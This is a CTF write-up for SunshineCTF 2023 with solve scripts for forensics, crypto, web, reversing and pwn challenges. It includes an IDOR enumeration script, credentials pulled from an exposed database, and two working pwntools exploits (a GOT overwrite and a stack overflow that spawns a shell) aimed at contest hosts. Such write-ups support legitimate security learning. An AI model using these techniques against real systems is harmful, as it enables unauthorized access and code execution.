# SunshineCTF 2023
###### tags: `CTF`

## Misc
### Initialization

copy and paste

`sun{i_am_here}`

## forensics
### Low Effort Wav 🌊

the challenge give us a .wav file

but when using `file` command, it identify as png file

when we open it, it shows a croped image and has no flag

but when we use exiftool, we found that the image is from google pixel 7, ans it has a vulnerability of crop the screenshoot (CVE-2023-21036, aka aCropalypse)

[news](https://twitter.com/ItsSimonTime/status/1636857478263750656)

we can use the [tool](https://acropalypse.app/) to recover the flag

`sun{well_that_was_low_effort}`

## Crypto
### BeepBoop Cryptography

:::spoiler BeepBoop
```!
beep beep beep beep boop beep boop beep beep boop boop beep beep boop boop beep beep boop boop beep boop beep beep beep beep boop boop beep beep beep beep boop beep boop boop boop boop beep boop boop beep boop boop boop beep beep boop beep beep boop boop beep boop beep boop boop beep boop boop beep beep boop boop boop beep boop boop boop beep beep boop beep beep boop boop beep beep boop beep boop beep boop boop boop boop beep boop beep beep boop boop boop beep boop boop beep beep boop boop beep beep beep beep boop beep boop boop beep boop boop boop beep beep boop boop beep beep boop boop boop beep boop boop boop beep beep boop beep beep beep boop beep boop boop beep boop beep boop boop boop beep beep boop beep beep boop boop beep boop beep boop boop beep boop boop beep beep boop boop boop beep boop boop boop beep beep boop beep beep boop boop beep beep boop beep boop beep boop boop boop boop beep boop beep beep boop boop boop beep boop boop beep beep boop boop beep beep beep beep boop beep boop boop beep boop boop boop beep beep boop boop beep beep boop boop boop beep boop boop boop beep beep boop beep beep beep boop beep boop boop beep boop beep boop boop boop beep beep boop beep beep boop boop beep boop beep boop boop beep boop boop beep beep boop boop boop beep boop boop boop beep beep boop beep beep boop boop beep beep boop beep boop beep boop boop boop boop beep boop beep beep boop boop boop beep boop boop beep beep boop boop beep beep beep beep boop beep boop boop beep boop boop boop beep beep boop boop beep beep boop boop boop beep boop boop boop beep beep boop beep beep boop boop boop boop boop beep boop
```
:::

receive a lot of `beep` and `boop`. guess it may be the binary with 1/0 as `beep`/`boop`

after trying, know that `beep` is 0 and `boop` is 1. get the new message `fha{rkgrezvangr-rkgrezvangr-rkgrezvangr}`

it may be do some casear cipher, so just simply calculate it and the k=13. get the flag

`sun{exterminate-exterminate-exterminate}`

## Web
### BeepBoop Blog

the challenge give us a blog website

after reading the network, found that there is an api that get all message at `/posts/` endpoint and get a single message at `/post/{id}/`. and in the response json, there is a column called `hidden`. so it can be guess as an IDOR challenge

During the observation, it can be found that the minimum of index is 0 and the maximum is 1023, so we can write a script to parse the `/posts/` and find out which id is not shown in all posts

:::spoiler solve.py
```python
import requests
from tqdm import tqdm

url = "http://beepboop.web.2023.sunshinectf.games/posts/"
res = requests.get(url, verify=False)
posts = res.json()["posts"]
print(len(posts))

binmap = [False for _ in range(1024)]
for post in posts:
    id = int(post["post_url"].split("/post/")[1])
    binmap[id] = True

print(binmap.index(False))
```
:::

we found that id `608` isn't appear, so we can take a look at it. the flag is in it

`sun{wh00ps_4ll_IDOR}`

### Hotdog Stand

The challenge give us a login page, but for robots

So it can be easily guessed that there may has an `robots.txt`

In the `robots.txt`, it says

```!
User-agent: * Disallow: /configs/ Disallow: /backups/ Disallow: /hotdog-database/
```

After trying these path, there is an `database.db` file in `/hotdog-database/` endpoint. And it is Sqlite3 file

```sh
download.db: SQLite 3.x database, last written using SQLite version 3041002
```

We can first look at all the tables

```sql
.tables
/* credentials       customer_reviews  menu_items        robot_logs */
```

There is a credentials, it may be the user databases use for login

```sql
select * from credentials;
/* 1|hotdogstand|slicedpicklesandonions|admin */
```

So we got the username `hotdogstand` and password `slicedpicklesandonions`. Login and get the flag

`sun{5l1c3d_p1cKl35_4nd_0N10N2}`

## Reversing
### Dill

the challenge give us a pyc file. we can use decompyle3 or uncompyle6 to reverse it to the python source code. here i use decompyle3

```bash
decompyle3 ./dill.cpython-38.pyc > dill.py
```

here is the source code

:::spoiler dill.py
```python
# decompyle3 version 3.9.0
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.8.10 (default, Nov 14 2022, 12:59:47) 
# [GCC 9.4.0]
# Embedded file name: dill.py
# Compiled at: 2023-10-07 03:53:54
# Size of source mod 2**32: 914 bytes


class Dill:
    prefix = 'sun{'
    suffix = '}'
    o = [5,1,3,4,7,2,6,0]

    def __init__(self) -> None:
        self.encrypted = 'bGVnbGxpaGVwaWNrdD8Ka2V0ZXRpZGls'

    def validate(self, value: str) -> bool:
        if not (value.startswith(Dill.prefix) and value.endswith(Dill.suffix)):
            return False
        value = value[len(Dill.prefix):-len(Dill.suffix)]
        if len(value) != 32:
            return False
        c = [value[i:i + 4] for i in range(0, len(value), 4)]
        value = ''.join([c[i] for i in Dill.o])
        if value != self.encrypted:
            return False
        return True
# okay decompiling ./dill.cpython-38.pyc
```
:::

we can know that it has a validate function and a encrypted text. After reading the validating logic, we can know that it just do a text sequence changing. so we can write a script to reverse it back

:::spoiler solve.py
```python
o = [5,1,3,4,7,2,6,0]
encrypted = 'bGVnbGxpaGVwaWNrdD8Ka2V0ZXRpZGls'

plaintext = [None for _ in range(len(encrypted)//4)]
for i in range(8):
    plaintext[o[i]] = encrypted[i*4:i*4+4]

print("sun{" + "".join(plaintext) + "}")
```
:::

`sun{ZGlsbGxpa2V0aGVwaWNrbGVnZXRpdD8K}`

### Frist Date

The challenge give us an pdz file and a pdxinfo. We don't know what it is

After doing some googling stuff, we found a repository called [playdate-reverse-engineering](https://github.com/cranksters/playdate-reverse-engineering/blob/main/formats/pdz.md) and it says it is a compress of luac files. Also it provide a [tool](https://github.com/cranksters/playdate-reverse-engineering/blob/main/tools/pdz.py) can extract pdz file to a directory contains a lot of luac

Also, in its [issue](https://github.com/cranksters/playdate-reverse-engineering/issues/5) tab, someone asked is there any tool can convert luac to lua source code. And there is [unluac](https://github.com/scratchminer/unluac) tool had been talked about. So we can use this tool to decompile back to lua file

:::spoiler main.lua
```lua
import("CoreLibs/graphics")
print("Figure out my code and I'll give you a flag!")
print("Turn the crank to reset the pin. ")
-- ...
function generateOrder()
	local pinSeed = ""
	for i = 1, 20 do
		pinSeed = pinSeed .. i
	end
	return pinSeed
end
-- ...
function clean(input)
	local cleaned = ""
	for i = 1, #input, 2 do
		local pair = input:sub(i, i + 1)
		local num = tonumber(pair)
		num = num % 26 + 65
		cleaned = cleaned .. string.char(num)
	end
	return cleaned
end
index = ""
lastPressed = "Press a button!"
function playdate.update()
    -- ...
	if pressedButtons == generateOrder() then
		print("Pin entered correctly!")
		gfx.setFont(gfx.font.kVariantBold)
		cleaned = clean(pressedButtons)
		print("Flag: sun{" .. cleaned .. "}")
		gfx.drawTextAligned([[
Flag: 
sun{]] .. cleaned .. "}", 200.0, 80.0, kTextAlignment.center)
	end
end

```
:::

As you can see, when the game do has an update, it check whether the `pressedButtons` is same as the result of `generateOrder()`. If same, it do a `clean()` on the `pressedButtons` and print the flag. So the flag is the `sun{` + result of `clean(generateOrder())` + `}`

I wrote a python script for calculate it. Here is my script

:::spoiler solve.py
```python
def generateOrder():
	pinSeed = ""
	for i in range(1, 20+1):
		pinSeed = pinSeed + str(i)
	return pinSeed
def clean(input):
	cleaned = ""
	for i in range(1,len(input)+1,2):
		pair = input[i-1:i+1]
		num = int(pair)
		num = num % 26 + 65
		cleaned = cleaned + chr(num)
	return cleaned

cleaned = clean(generateOrder())
print("Flag: sun{" + cleaned + "}")
```
:::

`sun{MIEANBLVFPZJTDOA}`

## Scripting
### DDR

When connect to the server, it says the below message

```
Welcome to DIGITAL DANCE ROBOTS!

       -- INSTRUCTIONS --
 Use the WASD keys to input the
 arrow that shows up on screen.
 If you beat the high score of
     255, you win a FLAG!

   -- Press ENTER To Start --
```

Then after we press the enter, it will show a question to us. Here is an example

```
⇦⇧⇩⇨⇨⇩⇩⇩⇨⇦⇦⇨⇩⇨⇧⇩⇩⇧⇧⇧⇨⇧⇧⇩⇨⇧⇧⇨⇩⇩⇦⇧⇧⇧⇩⇩⇧⇩⇩⇦⇦⇩⇨⇩⇧⇩⇦⇩⇨⇩
```

Because it give us a short time to answer it, so we must have to write a script to automatic answer it.

Before writing the script, we have to know the text code of the arrows. It can be found in the UTF-8 Encoding from [here](https://www.compart.com/en/unicode/U+21E9)

Here is my script

:::spoiler solve.py
```python
from pwn import *
from tqdm import tqdm
# context.log_level = "debug"

conn = remote("chal.2023.sunshinectf.games", 23200)

conn.sendlineafter(b"-- Press ENTER To Start --   \r\n", b"")
conn.recvline()
for j in tqdm(range(256)):
    dance = conn.recvline().strip()

    ret = b""
    for i in range(0,len(dance),3):
        if dance[i:i+3] == b"\xe2\x87\xa9":
            ret += b"s"
        elif dance[i:i+3] == b"\xe2\x87\xa8":
            ret += b"d"
        elif dance[i:i+3] == b"\xe2\x87\xa6":
            ret += b"a"
        elif dance[i:i+3] == b"\xe2\x87\xa7":
            ret += b"w"

    # print(f"{dance=}")
    conn.sendline(ret)
    if(j == 254):
        context.log_level = "debug"
conn.close()
```
:::

`sun{d0_r0b0t5_kn0w_h0w_t0_d4nc3}`

### SimonProgrammer 1

The challenge is a simon say game, but for the different frequency version

Here is the source code of the challenge (partial)

:::spoiler
```javascript
function checkAnswer() {
    for (let j = 0; j < current_frequencies_used_global.length; j++) {
        if (global_frequencies[j].indexOf(current_frequencies_used_global[j]) < 0) {
            return false;
        }
    }
    return true;
}

async function generateButtons() {
    document.getElementById("contents").innerHTML = "";
    loadWavFiles().then(wav_files => {
        let wav_file_list = wav_files.files
        for (let i = 0; i < wav_file_list.length; i++) {
            //...

            const linkElement = document.createElement("a");
            linkElement.onclick = evt => {
                document.getElementById(filename).style = "color:yellow"
                current_frequencies_used_global.push(frequency);
                var audio = new Audio(filename);
                audio.play()
                    .then(() => {
                        if (current_frequencies_used_global.length == global_limit) {
                            if (checkAnswer()) {
                                setTimeout(playSimon, 250, global_limit + 1)
                            }
                            else {
                                alert("Sequence failed")
                            }
                        }
                        document.getElementById(filename).style = ""
                    })
            };
            //...
            buttonElement.appendChild(linkElement);

            document.getElementById("contents").appendChild(buttonElement);
        }
        return new Promise(() => true)
    })
}

function playSimon(i) {
    if (i > global_frequencies.length) {
        // WON
        submitFrequencies(current_frequencies_used_global).then(flag => {
            document.getElementById("contents").innerHTML = "";
            // in case they lost
            document.getElementById("PLAY").setAttribute("onclick", "location.reload();");
            const buttonElement = document.createElement("div");
            buttonElement.classNames = "button";

            const textElement = document.createElement("p");
            textElement.innerText = flag.msg;
            buttonElement.appendChild(textElement);

            document.getElementById("contents").appendChild(buttonElement);
        })
        return;
    }
    current_frequencies_used_global = []
    global_limit = i
    playList(0, i, global_frequencies)
}

function playSimonWrapper() {
    loadFrequencies().then(frequencies => {
        global_frequencies = frequencies.frequencies
        global_counter = 0;
        setTimeout(playSimon, 250, 10)
    })
}
```
:::

As you can see, when the game start, it will get the frequency list for the sequence. Then it will call `playSimon(10)` as this time we need to click the first 10 frequence button. Each time we click the frequency, the frequency will add into the `current_frequencies_used_global`. When we click all the 10 buttons, the game will check whether it met the frequency sequence. If yes, it will call `playSimon(11)` for the next round. When we do all the 30 rounds, it will send the sequence to `/flag` endpoint and get the flag

I had try to bypass the game but failed, but it can be cheating to speedup. We can directly call `playSimon(30)` to answer the last round and set the `current_frequencies_used_global` with first 29 frequence. After that, we only need to click the lastest frequence and the game will think that we finished and it will send us the flag

Here is the helper script which can parsing the frequency list to the correct format for easy copy and paste

:::spoiler solve.py
```python
global_freq = [...]

print(f"playSimon({len(global_freq)})")
hack = []
for gf in global_freq:
    freq = gf.split("/")[2].split(".")[0]
    hack.append(freq)
print(f"current_frequencies_used_global = {hack[:-1]}")
print(f"click {hack[-1]}")
```
:::

`sun{simon_says_wait_that_was_a_mistake_what_do_you_mean_i_gave_all_the_frequencies}`

### SimonProgrammer 3

This challenge is nearly as same as SimonProgrammer1. But in this challenge, it shows a lot of wierd uuid stuff. Also, when I use the script for SimonProgrammer1 to solve it, it shows `format: [frequency, frequency, frequency...]`. Seems that we have to guess the frequency of the audio

So after doing some searching, I found some useful data ([data1](https://stackoverflow.com/questions/75286292/get-maximum-of-spectrum-from-audio-file-with-python-audacity-like), [data2](https://stackoverflow.com/questions/3694918/how-to-extract-frequency-associated-with-fft-values-in-python)) about how to use fft in numpy to get the spectrum of the audio and use some argmax stuff to get the maximum one. So I wrote the following script for this

:::spoiler solve.py
```python
from scipy.io import wavfile
import numpy as np
import requests
import warnings
from tqdm import tqdm

global_freq = [...]


print(f"playSimon({len(global_freq)})")
hack = []
for gf in global_freq:
    freq = gf.split("/")[2].split(".")[0]
    hack.append(freq)
print(f"current_frequencies_used_global = {hack[:-1]}")
print(f"click {hack[-1]}")

# real frequency
print("analysis...")
freqlist = [60, 1000, 2000, 3000, 4000, 5000, 6000, 7000, 8000, 9000, 9999]
frequencies = []
warnings.filterwarnings("ignore")
for gf in tqdm(global_freq):
    res = requests.get(f"https://simon3.web.2023.sunshinectf.games{gf}", verify=False)
    open("temp.wav", "wb").write(res.content)
    sample_rate, samples = wavfile.read("temp.wav")
    # fft_samples = np.abs(np.fft.fft(samples))
    # peak_index=np.argmax(fft_samples)
    # max_frequency = peak_index / (len(samples)) * sample_rate
    fft_samples = np.fft.fft(samples)
    peak_index=np.argmax(np.abs(fft_samples))
    freqs = np.fft.fftfreq(len(fft_samples))
    freq = freqs[peak_index]
    max_frequency = abs(freq * sample_rate)
    frequencies.append(int(max_frequency))
print(f"submitFrequencies({frequencies}).then(console.log)")
```
:::

After doing `playSimon(100)` and do the right click, we can do `submitFrequencies` to get the flag

`sun{simon_says_automated_solve_or_bust}`

## pwn
### 😎 Array of Sunshine ☀️

The challenge give us a binary. let's check the security mechanism of the binary

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x3fe000)
```

As we can see, the program has canary and nx but no pie

Then, we can do a reversing for it and see what the binary do

:::spoiler main
```clike
void main(void)

{
  printf_sym = sym_lookup("printf");
  scanf_sym = sym_lookup("scanf");
  logo();
  do {
    basket();
  } while( true );
}

```
:::

In main, it read the address of `printf` and `scanf`, then it print the logo. And then there is a infinite loop and do `basket` function

:::spoiler basket
```clike
void basket(void)

{
  long in_FS_OFFSET;
  int local_34;
  undefined *local_30;
  undefined *local_28;
  long local_20;
  undefined8 local_18;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("\nWhich fruit would you like to eat [0-3] >>> ");
  __isoc99_scanf("%i",&local_34);
  printf("Replace it with a new fruit.\n",(&fruits)[local_34]);
  printf("Type of new fruit >>>");
  __isoc99_scanf("%24s",&fruits + local_34);
  local_30 = &DAT_00404020;
  local_28 = &DAT_00404038;
  local_20 = _DAT_00404020;
  local_18 = _DAT_00404038;
  if ((printf_sym == _DAT_00404020) && (printf_sym == _DAT_00404020)) {
    if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
      __stack_chk_fail();
    }
    return;
  }
                    /* WARNING: Subroutine does not return */
  exit(-1);
}
```
:::

In the basket function, it ask us the fruit we want to replace. Then it ask us it will replace to what. At the end, it do an exit

Also, the binary has a `win` function which will read the content of `flag.txt`

After reading the source code, it can found a vulnerability in `basket` function. When it ask which fruit we want to replace, it forget to check the bound of the input. So we can do a OOB write and maybe write to the GOT of the `exit` function

Here is the exploit

:::spoiler solve.py
```python
from pwn import *
binary = "./sunshine"

context.terminal = ["cmd.exe", "/c", "start", "bash.exe", "-c"]
context.log_level = "debug"
context.binary = binary

conn = remote("chal.2023.sunshinectf.games", 23003)
#conn = process(binary)
# conn = gdb.debug(binary)

conn.sendlineafter(b"[0-3] >>> ", str(0x100000000-0x8).encode()) # exit.got.plt
conn.sendlineafter(b"fruit >>>", p64(0x40128f)) # win

conn.interactive()
```
:::

`sun{a_ray_of_sunshine_bouncing_around}`

### Flock of Seagulls 🕊️

Then challenge give us a binary, first check the security protection for it

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fe000)
```

It has nx enabled, but no canary nor pie

Let's decompile the binary and see what is inside it

:::spoiler
```clike
undefined8 main(void)

{
  puts("MMMMMMM...");
  func1();
  return 0;
}
void func1(void)
{
  func2();
  return;
}
void func2(void)
{
  long in_stack_00000000;
  
  func3();
  if (in_stack_00000000 != 0x4012f0) {
    fail();
  }
  return;
}
void func3(void)
{
  long in_stack_00000000;
  
  func4();
  if (in_stack_00000000 != 0x4012ca) {
    fail();
  }
  return;
}
void func4(void)
{
  long in_stack_00000000;
  
  func5();
  if (in_stack_00000000 != 0x4012a0) {
    fail();
  }
  return;
}
void func5(void)
{
  long in_stack_00000000;
  undefined local_88 [112];
  ssize_t local_18;
  undefined *local_10;
  
  local_10 = local_88;
  printf("<<< Song Begins At %p\n",local_10);
  printf("PwnMe >>> ");
  local_18 = read(0,local_88,500);
  if (in_stack_00000000 != 0x401276) {
    fail();
  }
  return;
}
void win(void)
{
  system("/bin/sh");
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```
:::

The binary call from `main` -> `func1` -> `func2` -> `func3` -> `func4` -> `func5`. And there is an obvious stack overflow in func5. But in func2 to func5 it will check the return address is the last function. So we have to make sure the rbp and rbp+8 will not changed in the stack frame of func2 to func5 during we build the bof paylaod

Here is the exploit

:::spoiler solve.py
```python
from pwn import *
binary = "./flock"

context.terminal = ["cmd.exe", "/c", "start", "bash.exe", "-c"]
context.log_level = "debug"
context.binary = binary

conn = remote("chal.2023.sunshinectf.games", 23002)
# conn = process(binary)
# conn = gdb.debug(binary)

conn.recvuntil(b"Song Begins At")
leak = int(conn.recvline().strip()[2:], 16)

print(leak, hex(leak))

payload = b"A"*8*16 + p64(leak+0x80+0x20) + p64(0x00401276) 
payload += b"A"*8*2 + p64(leak+0x80+0x20*2) + p64(0x004012a0)
payload += b"A"*8*2 + p64(leak+0x80+0x20*3) + p64(0x004012ca)
payload += b"A"*8*2 + p64(leak+0x80+0x20*4) + p64(0x004012f0)
payload += b"A"*8 + p64(0x4010ef) + p64(0x004011b9) # nop, win
conn.sendlineafter(b"PwnMe >>> ", payload)
conn.interactive()
```
:::

`sun{here_then_there_then_everywhere}`